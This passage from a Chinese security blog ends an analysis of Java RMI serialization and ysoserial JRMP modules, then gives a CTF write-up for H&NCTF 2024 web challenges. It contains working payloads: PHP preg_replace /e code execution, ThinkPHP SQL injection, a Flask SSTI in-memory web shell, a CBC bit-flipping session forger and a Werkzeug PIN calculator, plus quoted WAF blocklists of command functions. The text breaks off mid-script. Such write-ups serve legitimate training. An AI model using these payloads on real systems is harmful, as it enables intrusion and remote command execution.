04</span><br><span class="line">classDescFlags - 0x02 - SC_SERIALIZABLE</span><br><span class="line">fieldCount - 0 - 0x00 00</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_CLASSDESC - 0x72</span><br><span class="line">className</span><br><span class="line">Length - 28 - 0x00 1c</span><br><span class="line">Value - java.rmi.server.RemoteObject -</span><br><span class="line">0x6a6176612e726d692e7365727665722e52656d6f74654f626a656374</span><br><span class="line">serialVersionUID - 0xd3 61 b4 91 0c 61 33 1e</span><br><span class="line">newHandle 0x00 7e 00 05</span><br><span class="line">classDescFlags - 0x03 - SC_WRITE_METHOD |</span><br><span class="line">SC_SERIALIZABLE</span><br><span class="line">fieldCount - 0 - 0x00 00</span><br><span class="line">classAnnotations</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">superClassDesc</span><br><span class="line">TC_NULL - 0x70</span><br><span class="line">newHandle 0x00 7e 00 06</span><br><span class="line">classdata</span><br><span class="line">java.rmi.server.RemoteObject</span><br><span class="line">values</span><br><span class="line">objectAnnotation</span><br><span class="line">TC_BLOCKDATA - 0x77</span><br><span class="line">Length - 55 - 0x37</span><br><span class="line">Contents -</span><br><span class="line">0x000a556e6963617374526566000e3134302e3233382e33342e3231360000fa00276c05080</span><br><span class="line">63e8d45a4462ec50000016d8d8d6357800101</span><br><span class="line">TC_ENDBLOCKDATA - 0x78</span><br><span class="line">java.rmi.server.RemoteObjectInvocationHandler</span><br><span class="line">values</span><br></pre></td></tr></table></figure><p>这是一个 java.lang.reflect.Proxy 对象，其中有一段数据储存在 objectAnnotation 中:0x000a556e6963617374526566000e3134302e3233382e33342e3231360000fa00276c0508063e8d45a4462ec50000016d8d8d6357800101 ，记录了RMI Server的地址和端口。</p><p>在拿到RMI Server的地址和端口后，本机就会去连接并正式开始调用远程方法。我们再用 <code>tcp.streameq 1 </code>筛选出本机与RMI Server的数据流</p><p><img src="https://bu.dusays.com/2024/05/23/664f0228de286.png" alt="image-20240520202603143"></p><p>可见，wireshark没有再识别出RMI的协议。我们选择序号为19的数据包，其内容是 50 ac ed 开头，50是指 <a href="https://github.com/JetBrains/jdk8u_jdk/blob/master/src/share/classes/sun/rmi/transport/TransportConstants.java#L47">RMI Call </a>， ac ed 当然是Java序列化数据。</p><p>我们使用SerializationDumper查看这段序列化数据：</p><p><img src="https://bu.dusays.com/2024/05/23/664f022ab149e.png" alt="image-20240520202731991"></p><p>可见，我们的 codebase 是通过 [Ljava.rmi.server.ObjID; 的 classAnnotations 传递的。</p><p>所以，即使我们没有RMI的客户端，只需要修改 classAnnotations 的值，就能控制codebase，使其指向攻击者的恶意网站。</p><h4 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h4><p><a href="https://github.com/frohoff/ysoserial/tree/master/src/main/java/ysoserial">工具</a></p><p><img src="https://bu.dusays.com/2024/05/23/664f02257a4b6.png" alt="image-20240520204117334"></p><p>exploit里是直接可以攻击的</p><p>payloads里是需要一些工具来的</p><h5 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h5><p>有三个：<br><img src="https://bu.dusays.com/2024/05/23/664f022368bf6.png" alt="image-20240520204413998"></p><p>RMIRegistryExploit.java：</p><p>低版本的直接攻击注册中心的</p><p>JRMPClient.java：</p><p>低版本攻击DGC服务</p><p>JRMPListener.java:</p><p>服务端发客户端请求  攻击普通的RMI也行</p><h5 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h5><p>里面有两个：</p><p><img src="https://bu.dusays.com/2024/05/23/664f0229786dc.png" alt="image-20240520205039866"></p><p>JRMPListener.java：<br>用的很少</p><p>在一个已有反序列化的点里，传进去后会暴露出一个RMI的接口出来 </p><p>也就是将一个普通的反序列化点转换成一个RMI的反序列化点  相当于二次反序列化 可能会绕过一些过滤</p><p>JRMPClient.java：</p><p>这个就很常见了</p><p>是整个rmi分析里面最重要的一个链子</p><p>前面的都是在针对rmi来打的 也就是针对rmi服务</p><p>但如果没看rmi服务呢 可以通过上面那个给他开一个</p><p>也可以是用这个 不用开rmi也能打 利用条件还比上一个宽 也相当于一个二次反序列化（可以打非rmi的利用链）</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> java </tag>
            
            <tag> 学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>h_nCTF-wp</title>
      <link href="/2024/05/23/H&amp;NCTF-wp/"/>
      <url>/2024/05/23/H&amp;NCTF-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="H-NCTF-WP"><a href="#H-NCTF-WP" class="headerlink" title="H&amp;NCTF WP"></a>H&amp;NCTF WP</h1><p>[官方wp](<a href="https://docs.qq.com/doc/p/641e8742c39d16cd6d046b18bcb251fd3ab0cd6d">H&amp;NCTF 2024 官方WP (qq.com)</a>)</p><h2 id="Please-RCE-Me"><a href="#Please-RCE-Me" class="headerlink" title="Please_RCE_Me"></a>Please_RCE_Me</h2><p>进入</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b08ad5.png" alt="image-20240522230646922"></p><p>提示是?moran&#x3D;flag get访问一下得到源码</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b51dd7.png" alt="image-20240522231219196"></p><p>题目源码如下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;moran&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$str1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line">        <span class="variable">$str2</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|assert|call|create|preg|sort|&#123;|&#125;|filter|exec|passthru|proc|open|echo|`| |\.|include|require|flag/i&#x27;</span>,<span class="variable">$str1</span>) || <span class="title function_ invoke__">strlen</span>(<span class="variable">$str2</span>) != <span class="number">19</span> || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/please_give_me_flag/&#x27;</span>,<span class="variable">$str2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/please_give_me_flag/ei&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;moran want a flag.&lt;/br&gt;(?moran=flag)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接replace &#x2F;e命令执行漏洞</p><p>由于正则开启了大小写匹配，所以可以用于绕过上面对于please_give_me_flag字符的检测，匹配到了就会执行task的代码，剩下的就是代码绕过了</p><p><code>\x2f\x66\x6c\x61\x67:/flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?moran=flag</span><br><span class="line"></span><br><span class="line">flag=please_give_me_flaG&amp;task=print(file_get_contents(&quot;\x2f\x66\x6c\x61\x67&quot;));</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/23/664f010c13d82.png" alt="image-20240522231437711"></p><h2 id="ez-tp"><a href="#ez-tp" class="headerlink" title="ez_tp"></a>ez_tp</h2><p>进来</p><p><img src="https://bu.dusays.com/2024/05/23/664f010adef6a.png" alt="image-20240522231831675"></p><p>amazing兄弟，非预期了，想想哥们上次也是被日志打了非预期，尊嘟想啸</p><p>dirsearch一扫 很多东西啊</p><p><img src="https://bu.dusays.com/2024/05/23/664f010c70127.png" alt="image-20240522232435345"></p><p>太多东西了 就不截完了</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b4c433.png" alt="image-20240522232523301"></p><p>有附件 </p><p>简单做下分析吧</p><p>App&#x2F;Home&#x2F;Controller&#x2F;IndexController.class.php</p><p>这里是tp的初始文件，滑到最下面可以发现如下逻辑</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">waf</span>())&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;12311&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="variable">$User</span>-&gt;<span class="title function_ invoke__">field</span>(<span class="string">&#x27;username,age&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$name</span>))-&gt;<span class="title function_ invoke__">select</span>();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">var_export</span>(<span class="variable">$ret</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>对waf的返回结果进行判断，然后走向不同的代码逻辑，这里大概可以看出来是要让结果返回false，走到sql执行那里，返回上面去看waf</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&quot;insert|update|delete|and|or|\/\*|\*|\.\.\/|\.\/|into|load_file|outfile|dumpfile|sub|hex&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|file_put_contents|fwrite|curl|system|eval|assert&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;</span>;</span><br><span class="line">            <span class="variable">$pattern</span>.= <span class="string">&quot;|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec&quot;</span>;</span><br><span class="line">            <span class="variable">$vpattern</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$pattern</span>);</span><br><span class="line">            <span class="variable">$bool</span> = <span class="literal">false</span>;</span><br><span class="line">            <span class="title function_ invoke__">var_dump</span>(<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure><p>设置了一堆正则</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$vpattern</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$v</span> <span class="keyword">as</span> <span class="variable">$kk</span> =&gt; <span class="variable">$vv</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$value</span>/i&quot;</span>, <span class="variable">$vv</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$bool</span>) <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$bool</span>) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$bool</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>利用套娃循环检测所有的键值是否含有黑名单字段，如果有就返回true，再往上好像也没什么特殊字段了，但现在有一个问题是如何触发这个h_n，然后去问了手GPT，得到了答案，大致格式如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/home/index/h_n</span><br></pre></td></tr></table></figure><p>以此来触发类中的方法，然后就去审代码看逻辑了，碰巧看到了日志，搜一手flag，拿下，paylaod如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php/home/index/h_n?name[0]=exp&amp;name[1]=%3d%27test123%27%20union%20select%201,flag%20from%20flag</span><br></pre></td></tr></table></figure><p>结合题目给的源码，找到对应的url（&#x2F;index.php）和payload: 把路由改一下改成h_n，bp抓包，把请求 头都删掉，访问拿到flag</p><p><img src="https://bu.dusays.com/2024/05/23/664f010beaf96.png" alt="image-20240522233157927"></p><h2 id="ezFlask"><a href="#ezFlask" class="headerlink" title="ezFlask"></a>ezFlask</h2><p>进入</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b185df.png" alt="image-20240522233332665"></p><p>只执行一次，很容易想到内存马，而且题目也给出了任意代码执行，这里构造模板注入进行内存马写入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=render_template_string(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;myshell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/23/664f010ce1e49.png" alt="image-20240523102927149"></p><p>然后&#x2F;shell?cmd&#x3D;grep+-rl+”flag{“+&#x2F;etc</p><p><img src="https://bu.dusays.com/2024/05/23/664f010c1ccc9.png" alt="image-20240523103301674"></p><p>然后&#x2F;shell?cmd&#x3D;cat+&#x2F;etc&#x2F;jaygalf</p><p><img src="https://bu.dusays.com/2024/05/23/664f010bbfed6.png" alt="image-20240523103351584"></p><p>flag{ad9faacb-a08a-42d8-88d7-ebcc5ac91c22}</p><p>这个payload也可以：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None,[]).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;cat /etc/jaygalf &#x27;).read())</span><br></pre></td></tr></table></figure><p>直接在&#x2F;Adventure里面发post就行</p><p><img src="https://bu.dusays.com/2024/05/23/664f010cc2592.png" alt="image-20240523103849908"></p><h2 id="flipPin"><a href="#flipPin" class="headerlink" title="flipPin"></a>flipPin</h2><p>进来</p><p><img src="https://bu.dusays.com/2024/05/23/664f010b8dbe9.png" alt="image-20240523104043521"></p><p>访问&#x2F;hint得源码</p><p><img src="https://bu.dusays.com/2024/05/23/664f010ba2913.png" alt="image-20240523104121542"></p><p>源代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, abort</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">default_session = <span class="string">&#x27;&#123;&quot;admin&quot;: 0, &quot;username&quot;: &quot;user1&quot;&#125;&#x27;</span></span><br><span class="line">key = get_random_bytes(AES.block_size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">session</span>):</span><br><span class="line">    iv = get_random_bytes(AES.block_size)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    <span class="keyword">return</span> b64encode(iv + cipher.encrypt(pad(session.encode(<span class="string">&#x27;utf-8&#x27;</span>), AES.block_size)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">session</span>):</span><br><span class="line">    raw = b64decode(session)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, raw[:AES.block_size])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">filename_blacklist = &#123;</span><br><span class="line">    <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cgroup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mountinfo&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;env&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(</span><br><span class="line">            <span class="string">&quot;welcome to the FlipPIN server try request /hint to get the hint&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session).decode())</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;have a fun&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hint&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    res = Response(<span class="built_in">open</span>(__file__).read(), mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/read&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">file</span>():</span><br><span class="line"></span><br><span class="line">    session = request.cookies.get(<span class="string">&#x27;session&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        res = Response(<span class="string">&quot;you are not logged in&quot;</span>)</span><br><span class="line">        res.set_cookie(<span class="string">&#x27;session&#x27;</span>, encrypt(default_session))</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        plain_session = decrypt(session)</span><br><span class="line">        <span class="keyword">if</span> plain_session <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;don\&#x27;t hack me&#x27;</span></span><br><span class="line"></span><br><span class="line">        session_data = json.loads(plain_session)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> session_data[<span class="string">&#x27;admin&#x27;</span>] :</span><br><span class="line">            filename = request.args.get(<span class="string">&#x27;filename&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(blacklist_str <span class="keyword">in</span> filename <span class="keyword">for</span> blacklist_str <span class="keyword">in</span> filename_blacklist):</span><br><span class="line">                abort(<span class="number">403</span>, description=<span class="string">&#x27;Access to this file is forbidden.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    <span class="keyword">return</span> f.read()</span><br><span class="line">            <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">                abort(<span class="number">404</span>, description=<span class="string">&#x27;File not found.&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                abort(<span class="number">500</span>, description=<span class="string">f&#x27;An error occurred: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;You are not an administrator&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">9091</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>CBC反转攻击+pin码计算</p><p>看下代码逻辑大概知道是要伪造session，受shiro721影响，看到aes，很容易想到什么什么翻转攻击，再集合恶意payload伪造，</p><p>CBC脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Random <span class="keyword">import</span> get_random_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1. 分组 16个字节一组</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&quot;admin&quot;: 0, &quot;us</span></span><br><span class="line"><span class="comment"># ername&quot;: &quot;user1&quot;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    2. 获取原始密文</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;wv7sRdpuU1HMAgqUWAOjoZuLsH9jUDnCaVtBxN8fQH6zyxmGqarbH7R/cuSUVx1xnKKDoUjIeo1GQwkg39DZ6Q==&#x27;</span></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = <span class="built_in">bytearray</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    3， 字节翻转</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line">array_cipher[offset] =  array_cipher[offset]^ <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;newCipher:&#x27;</span>,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>究其根本还是对于session的伪造，结果是将0改成其他数字，所以可以尝试考虑爆破，解码几次分析一下，大概就是在13位的样子，访问两次read，抓包，对于给出的session进行b64码表爆破，多尝试几次，最后会有一个类型不对的返回结果，证明爆破成功，修改对应session，加filename对文件进行读取即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">read?filename=巴拉巴拉</span><br></pre></td></tr></table></figure><p>这里涉及了一个黑名单问题，把self、cgroup给waf了，没遇到过</p><p>巧不巧，第一个就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤 cgroup</span><br><span class="line">用mountinfo或者cpuset</span><br></pre></td></tr></table></figure><p>替换伪造的Cookie信息，即可利用文件读取漏洞来获取pin码计算六要素</p><p>pin码计算脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span>, <span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>, <span class="comment"># 模式名，默认</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>, <span class="comment"># 应用名，默认</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span> <span class="comment"># 应用目录</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;116853226196301&#x27;</span>, <span class="comment"># /read?filename=sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;f67849d6-0b58-4a19-8e76-938d747b1e66dfb4ad54804b2fc5341f6b92e5c00dd69908f32e77c3be12ed4c26aa6783f210&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id  /proc/sys/kernel/random/boot_id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个也可以：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctfUser&#x27;</span>  <span class="comment"># username 可通过/etc/passwd获取</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/lib/python3.9/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span 